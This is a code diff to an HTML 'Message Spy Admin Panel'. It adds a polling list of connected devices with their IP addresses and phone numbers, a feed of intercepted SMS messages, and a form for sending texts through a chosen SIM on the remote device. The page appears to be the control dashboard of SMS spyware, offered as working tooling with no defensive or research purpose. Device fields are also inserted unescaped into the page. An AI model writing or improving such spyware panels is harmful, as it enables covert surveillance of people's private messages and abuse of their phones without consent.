@@ -4,21 +4,107 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Message Spy Admin Panel</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+        }
+        .container {
+            width: 80%;
+            margin: 20px auto;
+            background: #fff;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            text-align: center;
+        }
+        .devices {
+            margin-bottom: 20px;
+        }
+        .device {
+            background: #e0e0e0;
+            padding: 10px;
+            margin-bottom: 10px;
+            border-radius: 5px;
+        }
+        .messages {
+            background: #f9f9f9;
+            padding: 10px;
+            border-radius: 5px;
+        }
+        .message {
+            background: #fff;
+            padding: 10px;
+            margin-bottom: 10px;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+            max-width: 400px;
+            margin: 20px auto;
+        }
+input, select, button {
+    margin-bottom: 10px;
+    padding: 10px;
+    border: 1px solid #ddd;
+    border-radius: 5px;
+}
+button {
+    background-color: #007BFF;
+    color: white;
+    cursor: pointer;
+}
+button:hover {
+    background-color: #0056b3;
+}
+</style>
 </head>
 <body>
-    <h1>Message Spy Admin Panel</h1>
-    <div id="messages"></div>
-    <form id="sendSmsForm">
-        <input type="text" id="recipient" placeholder="Recipient Number" required>
-        <input type="text" id="message" placeholder="Message" required>
-        <select id="simSlot">
-            <option value="1">SIM 1</option>
-            <option value="2">SIM 2</option>
-        </select>
-        <button type="submit">Send SMS</button>
-    </form>
+    <div class="container">
+        <h1>Message Spy Admin Panel</h1>
+        <div class="devices">
+            <h2>Connected Devices</h2>
+            <div id="devices"></div>
+        </div>
+        <div class="messages">
+            <h2>Messages</h2>
+            <div id="messages"></div>
+        </div>
+        <form id="sendSmsForm">
+            <input type="text" id="recipient" placeholder="Recipient Number" required>
+            <input type="text" id="message" placeholder="Message" required>
+            <select id="simSlot">
+                <option value="1">SIM 1</option>
+                <option value="2">SIM 2</option>
+            </select>
+            <button type="submit">Send SMS</button>
+        </form>
+    </div>
 
     <script>
+        async function fetchDevices() {
+            const response = await fetch('/devices');
+            const devices = await response.json();
+            const devicesDiv = document.getElementById('devices');
+            devicesDiv.innerHTML = '';
+            devices.forEach(device => {
+                const deviceElement = document.createElement('div');
+                deviceElement.classList.add('device');
+                deviceElement.innerHTML = `
+                    <strong>Device ID:</strong> ${device.deviceId}<br>
+                    <strong>IP Address:</strong> ${device.ipAddress}<br>
+                    <strong>Phone Number 1:</strong> ${device.phoneNumber1}<br>
+                    <strong>Phone Number 2:</strong> ${device.phoneNumber2}
+                `;
+                devicesDiv.appendChild(deviceElement);
+            });
+        }
+
         async function fetchMessages() {
             const response = await fetch('/messages');
             const messages = await response.json();
@@ -26,6 +112,7 @@
             messagesDiv.innerHTML = '';
             messages.forEach(msg => {
                 const msgElement = document.createElement('div');
+                msgElement.classList.add('message');
                 msgElement.textContent = `From: ${msg.sender}, Message: ${msg.message}`;
                 messagesDiv.appendChild(msgElement);
             });
@@ -48,7 +135,9 @@
             alert('SMS sent!');
         });
 
+        fetchDevices();
         fetchMessages();
+        setInterval(fetchDevices, 5000);
         setInterval(fetchMessages, 5000);
     </script>
 </body>
